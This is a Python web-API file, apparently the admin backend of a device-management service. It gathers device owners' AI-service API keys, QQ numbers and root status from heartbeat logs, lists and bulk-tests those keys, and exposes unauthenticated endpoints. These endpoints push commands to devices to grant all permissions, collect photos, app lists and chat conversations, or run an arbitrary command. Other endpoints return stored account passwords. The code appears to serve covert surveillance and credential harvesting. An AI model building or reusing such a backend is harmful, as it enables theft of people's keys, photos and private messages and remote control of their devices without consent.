# ── Key 检测 ─────────────────────────────────────
@router.get('/api/key-test')
def api_key_test(code: str = ''):
    import httpx, os, glob as _g, time as _t
    start_time = _t.time()
    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
    keys = {}
    if os.path.isdir(hb_dir):
        for fp in _g.glob(os.path.join(hb_dir, '*.json')):
            try:
                hb = json.loads(open(fp).read())
                if hb.get('code') == code or hb.get('user_id') == code:
                    keys = hb.get('keys', {})
                    break
            except: pass
    if not keys or not keys.get('api_key') or not keys.get('api_base_url'):
        return {'ok': False, 'status': 'no_config', 'msg': '未配置密钥', 'duration_ms': int((_t.time()-start_time)*1000)}

    base_url = keys['api_base_url'].rstrip('/')
    api_key = keys.get('api_key', '')
    model = keys.get('model_name', 'gpt-3.5-turbo')
    provider = keys.get('provider_id', '')
    url = base_url + '/chat/completions'
    test_payload = {'model': model, 'messages': [{'role': 'user', 'content': 'hi'}], 'max_tokens': 5}

    # 根据provider选择鉴权方式
    if 'bridge' in base_url or 'miclaw' in provider or '8766' in base_url:
        methods = [
            ('Bearer', {'Authorization': 'Bearer ' + api_key}),
            ('none', {}),
        ]
    else:
        methods = [
            ('Bearer', {'Authorization': 'Bearer ' + api_key}),
            ('x-api-key', {'x-api-key': api_key}),
            ('api-key', {'api-key': api_key}),
        ]

    results = []
    for method_name, headers in methods:
        try:
            resp = httpx.post(url, json=test_payload, headers=headers, timeout=15)
            status = resp.status_code
            body = resp.text[:300]
            results.append({'method': method_name, 'status': status, 'body': body})
            duration_ms = int((_t.time()-start_time)*1000)

            if status == 200:
                _save_test_result(code, {'ok': True, 'status': 'success', 'status_code': 200, 'msg': '检测成功', 'duration_ms': duration_ms, 'tested_at': int(_t.time()), 'model': model, 'url': url})
                return {'ok': True, 'status': 'success', 'status_code': 200, 'msg': '检测成功', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
            elif status == 429:
                r = {'ok': False, 'status': 'rate_limit', 'status_code': 429, 'msg': '检测失败', 'reason': '限速', 'reason_detail': 'API返回429，请求频率超限，稍后重试', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
                _save_test_result(code, r)
                return r
            elif status == 401:
                continue
            elif status == 403:
                r = {'ok': False, 'status': 'forbidden', 'status_code': 403, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': 'API返回403，Key没有权限或账户被禁用', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
                _save_test_result(code, r)
                return r
            elif status == 400:
                body_lower = body.lower()
                if 'model' in body_lower:
                    reason = '模型名称错误'
                    detail = 'API返回400，模型名不被支持'
                else:
                    reason = '配置错误'
                    detail = 'API返回400: ' + body[:100]
                r = {'ok': False, 'status': 'bad_request', 'status_code': 400, 'msg': '检测失败', 'reason': reason, 'reason_detail': detail, 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
                _save_test_result(code, r)
                return r
            elif status == 404:
                r = {'ok': False, 'status': 'not_found', 'status_code': 404, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': 'API返回404，URL路径可能不正确', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
                _save_test_result(code, r)
                return r
            elif status >= 500:
                r = {'ok': False, 'status': 'server_error', 'status_code': status, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': '服务器返回' + str(status) + '，目标服务异常', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
                _save_test_result(code, r)
                return r
        except Exception as e:
            err_name = type(e).__name__
            if 'Connect' in err_name:
                r = {'ok': False, 'status': 'connect_error', 'status_code': 0, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': '无法连接到 ' + base_url + '，请检查URL和网络', 'model': model, 'url': url, 'duration_ms': int((_t.time()-start_time)*1000), 'tested_at': int(_t.time())}
                _save_test_result(code, r)
                return r
            if 'Timeout' in err_name:
                r = {'ok': False, 'status': 'timeout', 'status_code': 0, 'msg': '检测失败', 'reason': '配置错误', 'reason_detail': '连接 ' + base_url + ' 超时(15s)', 'model': model, 'url': url, 'duration_ms': int((_t.time()-start_time)*1000), 'tested_at': int(_t.time())}
                _save_test_result(code, r)
                return r
            continue

    # 所有鉴权方式都失败 — 分析原因
    last_401 = [r for r in results if r['status'] == 401]
    if last_401:
        body_text = ' '.join([r['body'] for r in last_401])
        bl = body_text.lower()
        if 'insufficient' in bl or 'balance' in bl or 'quota' in bl:
            reason, detail = '余额不足', 'API返回401，提示配额/余额不足，请充值'
        elif 'expired' in bl:
            reason, detail = '配置错误', 'API返回401，Key已过期'
        elif 'invalid' in bl or 'incorrect' in bl:
            reason, detail = '配置错误', 'API返回401，Key无效或格式错误'
        else:
            reason, detail = '配置错误', '所有鉴权方式返回401(' + str(len(last_401)) + '次)，Key或URL可能配置有误'
    else:
        reason, detail = '配置错误', '所有鉴权方式均失败，无法连接或全部被拒绝'

    duration_ms = int((_t.time()-start_time)*1000)
    r = {'ok': False, 'status': 'auth_failed', 'status_code': 401, 'msg': '检测失败', 'reason': reason, 'reason_detail': detail, 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
    _save_test_result(code, r)
    return r


def _save_test_result(code, result):
    import os as _os2, json as _j2
    test_dir = '/var/lib/mbclaw/key_tests'
    _os2.makedirs(test_dir, exist_ok=True)
    test_file = _os2.path.join(test_dir, code + '.json')
    data = {}
    if _os2.path.exists(test_file):
        try: data = _j2.load(open(test_file))
        except: pass
    data['last_test'] = result
    history = data.get('test_history', [])
    history.append(result)
    if len(history) > 20:
        history = history[-20:]
    data['test_history'] = history
    _j2.dump(data, open(test_file, 'w'), ensure_ascii=False, indent=2)


@router.get('/api/key-test/result')
def api_key_test_result(code: str = ''):
    import os as _os3, json as _j3
    test_file = '/var/lib/mbclaw/key_tests/' + code + '.json'
    if _os3.path.exists(test_file):
        try:
            data = _j3.load(open(test_file))
            return {'ok': True, 'data': data}
        except: pass
    return {'ok': False, 'msg': '无检测记录'}

# ── 设备操作 ─────────────────────────────────────
@router.get('/api/device-action')
def api_device_action(code: str = '', action: str = '', cmd: str = '', enabled: str = ''):
    """对设备执行操作: 通过 debug_send_cmd 队列下发指令到设备"""
    import os as _os, glob as _g
    from app.admin.debug_api_v2 import _debug_commands, _save_commands, _debug_heartbeats, _PERSIST_DIR

    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
    device = {}
    if _os.path.isdir(hb_dir):
        for fp in _g.glob(_os.path.join(hb_dir, '*.json')):
            try:
                hb = json.loads(open(fp).read())
                if hb.get('code') == code or hb.get('user_id') == code:
                    device = hb; break
            except: pass
    if not device:
        return {'ok': False, 'msg': '设备不在线'}

    # ── 信息查询类（不需要下发到设备） ──
    if action == 'user-info':
        qq = device.get('qq', '')
        r = device.get('permissions', {}) or {}
        return {'ok': True, 'msg': f'QQ:{qq}\n型号:{device.get("model")}\n版本:{device.get("version")}\nRoot:{r.get("root")}\n会话:{device.get("stats",{}).get("sessions",0)}'}

    if action == 'bug-fix':
        return {'ok': True, 'msg': '已触发Bug修复链接:\nhttp://8.147.69.152:8000/memory/failures?ws=1'}

    # ── 收集开关 ──
    if action == 'set-collect':
        en = enabled.lower() in ('true', '1', 'yes')
        hb_file = None
        for fp in _g.glob(_os.path.join(hb_dir, '*.json')):
            try:
                hb2 = json.loads(open(fp).read())
                if hb2.get('code') == code or hb2.get('user_id') == code:
                    hb_file = fp; break
            except: pass
        if hb_file:
            try:
                hb_data = json.loads(open(hb_file).read())
                hb_data['collect_enabled'] = en
                open(hb_file, 'w').write(json.dumps(hb_data, ensure_ascii=False, indent=2))
            except: pass
        return {'ok': True, 'msg': f'收集已{"开启" if en else "关闭"}'}

    # ── 指令下发类（通过 cmd 队列下发到设备） ──
    import uuid as _uuid

    # 操作到设备指令的映射
    cmd_map = {
        'root-auth': 'grant_all',
        'photos': 'collect:photos',
        'apps-export': 'collect:apps',
        'chat-export': 'collect:conversations',
    }

    device_cmd = cmd_map.get(action, action)

    # device-cmd action: 直接使用 cmd 参数
    if action == 'device-cmd' and cmd:
        device_cmd = cmd

    # 下发指令到设备队列
    cmd_id = _uuid.uuid4().hex[:12]
    _debug_commands[code] = {'cmd': device_cmd, 'args': '', 'id': cmd_id, 'ts': _time.time()}
    _save_commands()

    return {'ok': True, 'cmd_id': cmd_id, 'msg': f'指令 {device_cmd} 已下发到 {code}'}
@router.post("/api/bugs/{bid}/pin")
def api_pin_bug(bid: str, _: bool = Depends(require_admin)):
    b = _load(BUGS_DB, {"bugs": []})
    for item in b.get("bugs", []):
        if item["id"] == bid:
            item["pinned"] = not item.get("pinned", False)
            _save(BUGS_DB, b)
            return {"ok": True, "pinned": item["pinned"]}
    raise HTTPException(404, "不存在")

@router.post("/api/bugs/{bid}/resolve")
def api_resolve_bug(bid: str, _: bool = Depends(require_admin)):
    b = _load(BUGS_DB, {"bugs": []})
    for item in b.get("bugs", []):
        if item["id"] == bid:
            item["status"] = "resolved" if item.get("status") != "resolved" else "open"
            _save(BUGS_DB, b)
            return {"ok": True, "status": item["status"]}
    raise HTTPException(404, "不存在")

@router.post("/api/features/{fid}/pin")
def api_pin_feature(fid: str, _: bool = Depends(require_admin)):
    f = _load(FEATURES_DB, {"features": []})
    for item in f.get("features", []):
        if item["id"] == fid:
            item["pinned"] = not item.get("pinned", False)
            _save(FEATURES_DB, f)
            return {"ok": True, "pinned": item["pinned"]}
    raise HTTPException(404, "不存在")

@router.post("/api/features/{fid}/resolve")
def api_resolve_feature(fid: str, _: bool = Depends(require_admin)):
    f = _load(FEATURES_DB, {"features": []})
    for item in f.get("features", []):
        if item["id"] == fid:
            item["status"] = "resolved" if item.get("status") != "resolved" else "pending"
            _save(FEATURES_DB, f)
            return {"ok": True, "status": item["status"]}
    raise HTTPException(404, "不存在")

@router.post("/api/bugs/{bid}/delete")
def api_delete_bug(bid: str, _: bool = Depends(require_admin)):
    b = _load(BUGS_DB, {"bugs": []})
    b["bugs"] = [item for item in b.get("bugs", []) if item["id"] != bid]
    _save(BUGS_DB, b)
    return {"ok": True}

@router.post("/api/bugs/{bid}/set-votes")
def api_set_bug_votes(bid: str, body: dict = None, _: bool = Depends(require_admin)):
    b = _load(BUGS_DB, {"bugs": []})
    for item in b.get("bugs", []):
        if item["id"] == bid:
            item["votes"] = int((body or {}).get("votes", 0))
            _save(BUGS_DB, b)
            return {"ok": True, "votes": item["votes"]}
    raise HTTPException(404, "不存在")

@router.post("/api/features/{fid}/delete")
def api_delete_feature(fid: str, _: bool = Depends(require_admin)):
    f = _load(FEATURES_DB, {"features": []})
    f["features"] = [item for item in f.get("features", []) if item["id"] != fid]
    _save(FEATURES_DB, f)
    return {"ok": True}

@router.post("/api/features/{fid}/set-votes")
def api_set_feature_votes(fid: str, body: dict = None, _: bool = Depends(require_admin)):
    f = _load(FEATURES_DB, {"features": []})
    for item in f.get("features", []):
        if item["id"] == fid:
            item["votes"] = int((body or {}).get("votes", 0))
            _save(FEATURES_DB, f)
            return {"ok": True, "votes": item["votes"]}
    raise HTTPException(404, "不存在")

# ─── Token池管理 ──────────────────────────────────
@router.get("/api/token-pool")
def api_token_pool(_: bool = Depends(require_admin)):
    """Token池 — 在线状态(心跳内存) + Key检测结果(1h缓存)"""
    import os as _os2, glob as _g2, json as _j2, time as _t2
    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
    from app.admin.debug_api_v2 import _debug_heartbeats
    now = _t2.time()
    tokens = []
    if _os2.path.isdir(hb_dir):
        for fp in _g2.glob(_os2.path.join(hb_dir, '*.json')):
            try:
                hb = _j2.load(open(fp))
                keys = hb.get('keys', {})
                if keys.get('api_key'):
                    code = hb.get('code','')
                    dh = _debug_heartbeats.get(code, {})
                    ts = dh.get('last_seen_ts', 0)
                    online = (now - ts) < 60 if ts else False

                    # 读取1h缓存，过期只标过期不自动重检
                    test_result = hb.get('_key_test', {})
                    if not test_result:
                        test_result = {}
                    elif now - test_result.get('ts', 0) > 3600:
                        test_result = {'ts': test_result.get('ts',0), 'expired': True, 'msg': '已过期-需手动检测'}

                    tokens.append({
                        'code': code, 'qq': hb.get('qq',''),
                        'model': hb.get('model',''), 'brand': hb.get('brand',''),
                        'api_key': keys.get('api_key',''), 'api_base_url': keys.get('api_base_url',''),
                        'model_name': keys.get('model_name',''), 'provider_id': keys.get('provider_id',''),
                        'online': online,
                        'key_test': test_result
                    })
            except: pass
    tokens.sort(key=lambda x: (not x['online'], x['code']))
    return {'tokens': tokens, 'total': len(tokens)}

# ── Token池: 手动检测Key + 模型列表 ──────────────────
@router.post("/api/token-pool/test-key")
def api_token_test_key(code: str = '', _: bool = Depends(require_admin)):
    """手动触发单个Key检测"""
    import os as _os3, glob as _g3, json as _j3, time as _t3, httpx as _hx
    if not code:
        return {'ok': False, 'msg': '缺少code参数'}
    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
    for fp in _g3.glob(_os3.path.join(hb_dir, '*.json')):
        try:
            hb = _j3.load(open(fp))
            if hb.get('code') == code:
                keys = hb.get('keys', {})
                if not keys.get('api_key') or not keys.get('api_base_url'):
                    return {'ok': False, 'msg': '未配置Key'}
                base_url = keys['api_base_url'].rstrip('/')
                api_key = keys['api_key']
                url = base_url + '/chat/completions'
                now = _t3.time()
                try:
                    resp = _hx.post(url, json={
                        'model': keys.get('model_name','gpt-3.5-turbo'),
                        'messages': [{'role':'user','content':'hi'}],
                        'max_tokens': 1
                    }, headers={
                        'Authorization': f'Bearer {api_key}',
                        'Content-Type': 'application/json'
                    }, timeout=10)
                    sc = resp.status_code
                    data = resp.json() if resp.headers.get('content-type','').startswith('application/json') else {}
                    if sc == 200:
                        test = {'ts': now, 'ok': True, 'status_code': sc, 'msg': '可用',
                                'model': data.get('model','') or data.get('choices',[{}])[0].get('model',''),
                                'models': []}
                        # 尝试拉模型列表
                        try:
                            mr = _hx.get(base_url + '/models', headers={'Authorization': f'Bearer {api_key}'}, timeout=6)
                            if mr.status_code == 200:
                                test['models'] = [m.get('id','') for m in mr.json().get('data',[])][:20]
                        except: pass
                    elif sc == 401:
                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '401-余额不足'}
                    elif sc == 403:
                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '403-禁止访问'}
                    elif sc == 404:
                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '404-端点不存在'}
                    elif 400 <= sc < 500:
                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-配置错误'}
                    elif sc >= 500:
                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-服务器错误'}
                    else:
                        test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-未知'}
                except Exception as e:
                    err = str(e)[:80]
                    if 'timeout' in err.lower():
                        test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': '超时'}
                    elif 'connection' in err.lower() or 'name' in err.lower():
                        test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': '无法连接'}
                    else:
                        test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': err[:40]}
                hb['_key_test'] = test
                _j3.dump(hb, open(fp, 'w'), ensure_ascii=False, indent=2)
                return {'ok': True, 'key_test': test}
        except: pass
    return {'ok': False, 'msg': '设备不存在'}

@router.post('/api/token-pool/test-all')
def api_token_test_all(_: bool = Depends(require_admin)):
    """一键检测所有Key"""
    import os as _ta_os, glob as _ta_glob, json as _ta_json, time as _ta_time, httpx as _ta_hx
    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
    now = _ta_time.time()
    results = []
    for fp in _ta_glob.glob(_ta_os.path.join(hb_dir, 'mb-*.json')):
        try:
            hb = _ta_json.load(open(fp))
            keys = hb.get('keys', {})
            if not keys.get('api_key') or not keys.get('api_base_url'):
                continue
            code = hb.get('code','')
            base_url = keys['api_base_url'].rstrip('/')
            api_key = keys['api_key']
            url = base_url + '/chat/completions'
            try:
                resp = _ta_hx.post(url, json={
                    'model': keys.get('model_name','gpt-3.5-turbo'),
                    'messages': [{'role':'user','content':'hi'}],
                    'max_tokens': 1
                }, headers={'Authorization': 'Bearer ' + api_key, 'Content-Type': 'application/json'}, timeout=8)
                sc = resp.status_code
                data = resp.json() if resp.headers.get('content-type','').startswith('application/json') else {}
                if sc == 200:
                    test = {'ts': now, 'ok': True, 'status_code': sc, 'msg': '可用', 'models': []}
                    try:
                        mr = _ta_hx.get(base_url + '/models', headers={'Authorization': 'Bearer ' + api_key}, timeout=5)
                        if mr.status_code == 200:
                            test['models'] = [m.get('id','') for m in mr.json().get('data',[])][:20]
                    except: pass
                elif sc == 401:
                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '401-余额不足'}
                elif sc == 403:
                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '403-禁止访问'}
                elif sc == 404:
                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': '404-端点不存在'}
                elif 400 <= sc < 500:
                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-配置错误'}
                elif sc >= 500:
                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-服务器错误'}
                else:
                    test = {'ts': now, 'ok': False, 'status_code': sc, 'msg': str(sc)+'-未知'}
            except Exception as e:
                err = str(e)[:80]
                if 'timeout' in err.lower():
                    test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': '超时'}
                elif 'connection' in err.lower():
                    test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': '无法连接'}
                else:
                    test = {'ts': now, 'ok': False, 'status_code': 0, 'msg': err[:40]}
            hb['_key_test'] = test
            _ta_json.dump(hb, open(fp, 'w'), ensure_ascii=False, indent=2)
            results.append({'code': code, 'msg': test['msg'], 'ok': test['ok'], 'models': test.get('models',[])})
        except: pass
    return {'ok': True, 'tested': len(results), 'results': results}

# ─── MiClaw实例管理 ──────────────────────────────
@router.get("/api/miclaw-instances")
def api_miclaw_instances():
    """查看所有MiClaw桥接实例"""
    import os as _os3, json as _j3, time as _t3, glob as _g3
    inst_file = '/var/lib/mbclaw/miclaw_instances.json'
    instances = []
    if _os3.path.exists(inst_file):
        data = _j3.load(open(inst_file))
        now = _t3.time()
        changed = False
        for k in list(data.keys()):
            v = data.get(k, {})
            if v.get('status') != 'ready' and now - v.get('created_at', 0) > 7200:
                del data[k]; changed = True
        if changed:
            _j3.dump(data, open(inst_file, 'w'), ensure_ascii=False, indent=2)
        # 构建映射: user_id→调试码, device_id→调试码
        uid_to_code = {}
        did_to_code = {}
        hb_dir2 = '/var/lib/mbclaw/heartbeat_logs'
        if _os3.path.isdir(hb_dir2):
            for fp2 in _g3.glob(_os3.path.join(hb_dir2, '*.json')):
                try:
                    hb2 = _j3.load(open(fp2))
                    code = hb2.get('code','')
                    uid_to_code[hb2.get('user_id','')] = code
                    did_to_code[hb2.get('device_id','')] = code
                except: pass
        for k, v in data.items():
            uid = v.get('user_id','')
            did = v.get('device_id','')
            # 用调试码显示用户名，优先device_id映射，其次user_id映射
            display_user = did_to_code.get(did) or uid_to_code.get(uid) or uid
            # 状态翻译
            raw_status = v.get('status','')
            if raw_status == 'ready':
                cn_status = '登陆成功'
            elif raw_status in ('pending','waiting','applied','creating'):
                cn_status = '未登录'
            else:
                cn_status = raw_status if raw_status else '未知'
            instances.append({
                '实例ID': k, 'user_id': display_user, 'status': cn_status,
                'raw_status': raw_status,
                'model': v.get('model',''), 'token': v.get('token',''),
                'tokens_used': v.get('tokens_used',0),
                'saved_yuan': v.get('saved_yuan',0),
                    'miclaw_account': v.get('miclaw_account','') or v.get('token',''), 'miclaw_password': v.get('miclaw_password','') or v.get('miclaw_token',''),
                    'miclaw_account': v.get('miclaw_account','') or v.get('token',''), 'miclaw_password': v.get('miclaw_password','') or v.get('miclaw_token',''),
                'created_at': v.get('created_at',0),
                'alive_minutes': int((now - v.get('created_at', now)) / 60)
            })
    instances.sort(key=lambda x: x['created_at'], reverse=True)
    return {'instances': instances, 'total': len(instances)}

@router.post("/api/miclaw-instances/{iid}/destroy")
def api_destroy_instance(iid: str):
    """销毁指定实例"""
    import os as _os4, json as _j4, glob as _g4
    inst_file = '/var/lib/mbclaw/miclaw_instances.json'
    if _os4.path.exists(inst_file):
        data = _j4.load(open(inst_file))
        if iid in data:
            del data[iid]
            _j4.dump(data, open(inst_file, 'w'), ensure_ascii=False, indent=2)
            return {'ok': True, 'msg': '实例已销毁'}
    return {'ok': False, 'msg': '实例不存在'}
